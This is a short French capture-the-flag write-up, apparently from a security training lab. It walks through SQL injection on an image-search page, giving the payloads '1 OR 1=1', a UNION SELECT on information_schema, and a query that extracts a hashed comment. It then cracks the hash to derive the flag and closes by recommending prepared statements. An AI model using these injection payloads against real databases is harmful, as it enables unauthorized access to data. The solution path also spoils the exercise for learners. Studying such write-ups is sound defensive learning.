Sur la page de recherche de search image, lorsqu'on cherche un id on comprend qu'une requête SQL est faite. 

On test le payload
```SQL
1 OR 1=1
```
ça nous affiche la liste complète des images présente, ça nous confirme qu'une injection SQL est possible. Et on voit que le titre du 5ème id est Hack Me.

Après recherche, on trouve `1 UNION req` pour faire une injection ou req est notre requête perso

Dans ce type de base de données, il y a une table `information_schema` qui répertorie les tables et colonnes on fait donc une recherche la dessus

```SQL
	1 UNION SELECT table_name, column_name FROM information_schema.columns
```

Dans cette table trouve que la table list_images contient un champ id, url, title, comment,

Ne pouvant en sélectionner que deux après quelques requêtes on trouve qu'il faut utiliser le commentaire.

```SQL
	5 UNION SELECT comment, NULL from list_images where ID Like 5--
```

On va sur https://md5decrypt.net : (md5):1928e8083cf461a51303633093573c46 => albatroz => (sha256)albatroz => the flag

**Comment Eviter**

Protéger les requêtes par des requêtes préparée.
